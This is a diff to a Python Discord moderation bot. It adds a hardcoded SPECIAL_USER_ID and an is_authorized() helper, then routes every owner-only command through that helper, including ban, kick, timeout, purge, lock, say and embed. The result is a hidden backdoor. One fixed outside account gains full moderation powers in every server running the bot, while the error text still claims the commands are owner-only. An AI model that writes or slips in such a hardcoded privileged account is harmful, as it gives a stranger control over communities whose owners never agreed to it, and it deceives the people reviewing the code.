@@ -34,6 +34,8 @@ COLOR_DANGER = 0xE74C3C
 COLOR_INFO = 0x3498DB
 COLOR_PURPLE = 0x9B59B6
 
+SPECIAL_USER_ID = 1242143149917212767
+
 groq_api_client = None
 if GROQ_API_SECRET:
     try:
@@ -43,6 +45,9 @@ if GROQ_API_SECRET:
 
 sticky_messages = {}
 user_cooldowns = {}
+
+def is_authorized(interaction: discord.Interaction) -> bool:
+    return interaction.user == interaction.guild.owner or interaction.user.id == SPECIAL_USER_ID
 
 def make_embed(title: str, description: str, color: int = COLOR_NEUTRAL) -> discord.Embed:
     embed_instance = discord.Embed(title=title, description=description, color=color)
@@ -307,8 +312,8 @@ class ExtendedBotClient(commands.Bot):
 
         @self.tree.command(name="ban", description="Ban a member from the server. (Owner Only)")
         async def ban_slash(interaction: discord.Interaction, member: discord.Member, reason: Optional[str] = "No reason provided"):
-            if interaction.user != interaction.guild.owner:
-                return await interaction.response.send_message(embed=error_embed("Owner Only", "This command can only be used by the server owner."), ephemeral=True)
+            if not is_authorized(interaction):
+                return await interaction.response.send_message(embed=error_embed("Access Denied", "This command can only be used by the server owner."), ephemeral=True)
             try:
                 await member.ban(reason=reason)
                 await interaction.response.send_message(embed=success_embed("Member Banned", f"Successfully banned {member.mention}.\nReason: {reason}"))
@@ -317,8 +322,8 @@ class ExtendedBotClient(commands.Bot):
 
         @self.tree.command(name="unban", description="Unban a user by their user ID. (Owner Only)")
         async def unban_slash(interaction: discord.Interaction, user_id: str, reason: Optional[str] = "No reason provided"):
-            if interaction.user != interaction.guild.owner:
-                return await interaction.response.send_message(embed=error_embed("Owner Only", "This command can only be used by the server owner."), ephemeral=True)
+            if not is_authorized(interaction):
+                return await interaction.response.send_message(embed=error_embed("Access Denied", "This command can only be used by the server owner."), ephemeral=True)
             try:
                 user_obj = discord.Object(id=int(user_id))
                 await interaction.guild.unban(user_obj, reason=reason)
@@ -328,8 +333,8 @@ class ExtendedBotClient(commands.Bot):
 
         @self.tree.command(name="tempban", description="Temporary ban a member from the server. (Owner Only)")
         async def tempban_slash(interaction: discord.Interaction, member: discord.Member, duration_hours: float, reason: Optional[str] = "No reason provided"):
-            if interaction.user != interaction.guild.owner:
-                return await interaction.response.send_message(embed=error_embed("Owner Only", "This command can only be used by the server owner."), ephemeral=True)
+            if not is_authorized(interaction):
+                return await interaction.response.send_message(embed=error_embed("Access Denied", "This command can only be used by the server owner."), ephemeral=True)
             expiry = time.time() + (duration_hours * 3600)
             try:
                 await member.ban(reason=reason)
@@ -340,8 +345,8 @@ class ExtendedBotClient(commands.Bot):
 
         @self.tree.command(name="kick", description="Kick a member from the server. (Owner Only)")
         async def kick_slash(interaction: discord.Interaction, member: discord.Member, reason: Optional[str] = "No reason provided"):
-            if interaction.user != interaction.guild.owner:
-                return await interaction.response.send_message(embed=error_embed("Owner Only", "This command can only be used by the server owner."), ephemeral=True)
+            if not is_authorized(interaction):
+                return await interaction.response.send_message(embed=error_embed("Access Denied", "This command can only be used by the server owner."), ephemeral=True)
             try:
                 await member.kick(reason=reason)
                 await interaction.response.send_message(embed=success_embed("Member Kicked", f"Successfully kicked {member.mention}."))
@@ -350,8 +355,8 @@ class ExtendedBotClient(commands.Bot):
 
         @self.tree.command(name="timeout", description="Timeout a member for a specified duration in minutes. (Owner Only)")
         async def timeout_slash(interaction: discord.Interaction, member: discord.Member, minutes: int, reason: Optional[str] = "No reason provided"):
-            if interaction.user != interaction.guild.owner:
-                return await interaction.response.send_message(embed=error_embed("Owner Only", "This command can only be used by the server owner."), ephemeral=True)
+            if not is_authorized(interaction):
+                return await interaction.response.send_message(embed=error_embed("Access Denied", "This command can only be used by the server owner."), ephemeral=True)
             try:
                 until = discord.utils.utcnow() + datetime.timedelta(minutes=minutes)
                 await member.timeout(until, reason=reason)
@@ -361,8 +366,8 @@ class ExtendedBotClient(commands.Bot):
 
         @self.tree.command(name="untimeout", description="Remove timeout from a member. (Owner Only)")
         async def untimeout_slash(interaction: discord.Interaction, member: discord.Member, reason: Optional[str] = "No reason provided"):
-            if interaction.user != interaction.guild.owner:
-                return await interaction.response.send_message(embed=error_embed("Owner Only", "This command can only be used by the server owner."), ephemeral=True)
+            if not is_authorized(interaction):
+                return await interaction.response.send_message(embed=error_embed("Access Denied", "This command can only be used by the server owner."), ephemeral=True)
             try:
                 await member.timeout(None, reason=reason)
                 await interaction.response.send_message(embed=success_embed("Timeout Removed", f"Successfully removed timeout for {member.mention}."))
@@ -371,23 +376,23 @@ class ExtendedBotClient(commands.Bot):
 
         @self.tree.command(name="purge", description="Bulk delete messages in the channel. (Owner Only)")
         async def purge_slash(interaction: discord.Interaction, amount: int):
-            if interaction.user != interaction.guild.owner:
-                return await interaction.response.send_message(embed=error_embed("Owner Only", "This command can only be used by the server owner."), ephemeral=True)
+            if not is_authorized(interaction):
+                return await interaction.response.send_message(embed=error_embed("Access Denied", "This command can only be used by the server owner."), ephemeral=True)
             await interaction.response.defer(ephemeral=True)
             deleted = await interaction.channel.purge(limit=amount)
             await interaction.followup.send(embed=success_embed("Purge Complete", f"Successfully deleted {len(deleted)} messages."), ephemeral=True)
 
         @self.tree.command(name="warn", description="Issue an official warning to a member. (Owner Only)")
         async def warn_slash(interaction: discord.Interaction, member: discord.Member, reason: str):
-            if interaction.user != interaction.guild.owner:
-                return await interaction.response.send_message(embed=error_embed("Owner Only", "This command can only be used by the server owner."), ephemeral=True)
+            if not is_authorized(interaction):
+                return await interaction.response.send_message(embed=error_embed("Access Denied", "This command can only be used by the server owner."), ephemeral=True)
             await db_controller.execute("INSERT INTO warning_records (guild_id, target_id, moderator_id, reason) VALUES (?, ?, ?, ?)", (interaction.guild.id, member.id, interaction.user.id, reason))
             await interaction.response.send_message(embed=success_embed("Warning Issued", f"Warned {member.mention} for: {reason}"))
 
         @self.tree.command(name="warnings", description="View all warnings for a specific member. (Owner Only)")
         async def warnings_slash(interaction: discord.Interaction, member: discord.Member):
-            if interaction.user != interaction.guild.owner:
-                return await interaction.response.send_message(embed=error_embed("Owner Only", "This command can only be used by the server owner."), ephemeral=True)
+            if not is_authorized(interaction):
+                return await interaction.response.send_message(embed=error_embed("Access Denied", "This command can only be used by the server owner."), ephemeral=True)
             rows = await db_controller.fetchall("SELECT id, moderator_id, reason, timestamp FROM warning_records WHERE guild_id = ? AND target_id = ?", (interaction.guild.id, member.id))
             if not rows:
                 return await interaction.response.send_message(embed=info_embed("No Warnings", f"{member.mention} has no active warnings recorded."), ephemeral=True)
@@ -401,8 +406,8 @@ class ExtendedBotClient(commands.Bot):
 
         @self.tree.command(name="slowmode", description="Set the slowmode delay for the current channel in seconds. (Owner Only)")
         async def slowmode_slash(interaction: discord.Interaction, seconds: int):
-            if interaction.user != interaction.guild.owner:
-                return await interaction.response.send_message(embed=error_embed("Owner Only", "This command can only be used by the server owner."), ephemeral=True)
+            if not is_authorized(interaction):
+                return await interaction.response.send_message(embed=error_embed("Access Denied", "This command can only be used by the server owner."), ephemeral=True)
             try:
                 await interaction.channel.edit(slowmode_delay=seconds)
                 await interaction.response.send_message(embed=success_embed("Slowmode Updated", f"Channel slowmode set to `{seconds}` seconds."))
@@ -411,8 +416,8 @@ class ExtendedBotClient(commands.Bot):
 
         @self.tree.command(name="lock", description="Lock the current channel to prevent members from sending messages. (Owner Only)")
         async def lock_slash(interaction: discord.Interaction):
-            if interaction.user != interaction.guild.owner:
-                return await interaction.response.send_message(embed=error_embed("Owner Only", "This command can only be used by the server owner."), ephemeral=True)
+            if not is_authorized(interaction):
+                return await interaction.response.send_message(embed=error_embed("Access Denied", "This command can only be used by the server owner."), ephemeral=True)
             try:
                 await interaction.channel.set_permissions(interaction.guild.default_role, send_messages=False)
                 await interaction.response.send_message(embed=success_embed("Channel Locked", "This channel has been locked."))
@@ -421,8 +426,8 @@ class ExtendedBotClient(commands.Bot):
 
         @self.tree.command(name="unlock", description="Unlock the current channel. (Owner Only)")
         async def unlock_slash(interaction: discord.Interaction):
-            if interaction.user != interaction.guild.owner:
-                return await interaction.response.send_message(embed=error_embed("Owner Only", "This command can only be used by the server owner."), ephemeral=True)
+            if not is_authorized(interaction):
+                return await interaction.response.send_message(embed=error_embed("Access Denied", "This command can only be used by the server owner."), ephemeral=True)
             try:
                 await interaction.channel.set_permissions(interaction.guild.default_role, send_messages=True)
                 await interaction.response.send_message(embed=success_embed("Channel Unlocked", "This channel has been unlocked."))
@@ -431,15 +436,15 @@ class ExtendedBotClient(commands.Bot):
 
         @self.tree.command(name="say", description="Make the bot say something in the channel. (Owner Only)")
         async def say_slash(interaction: discord.Interaction, message: str):
-            if interaction.user != interaction.guild.owner:
-                return await interaction.response.send_message(embed=error_embed("Owner Only", "This command can only be used by the server owner."), ephemeral=True)
+            if not is_authorized(interaction):
+                return await interaction.response.send_message(embed=error_embed("Access Denied", "This command can only be used by the server owner."), ephemeral=True)
             await interaction.response.send_message(embed=success_embed("Message Sent", "Done!"), ephemeral=True)
             await interaction.channel.send(message)
 
         @self.tree.command(name="embed", description="Send a custom text inside an embed. (Owner Only)")
         async def embed_slash(interaction: discord.Interaction, title: str, description: str):
-            if interaction.user != interaction.guild.owner:
-                return await interaction.response.send_message(embed=error_embed("Owner Only", "This command can only be used by the server owner."), ephemeral=True)
+            if not is_authorized(interaction):
+                return await interaction.response.send_message(embed=error_embed("Access Denied", "This command can only be used by the server owner."), ephemeral=True)
             await interaction.response.send_message(embed=success_embed("Embed Sent", "Done!"), ephemeral=True)
             await interaction.channel.send(embed=make_embed(title, description, COLOR_INFO))
 
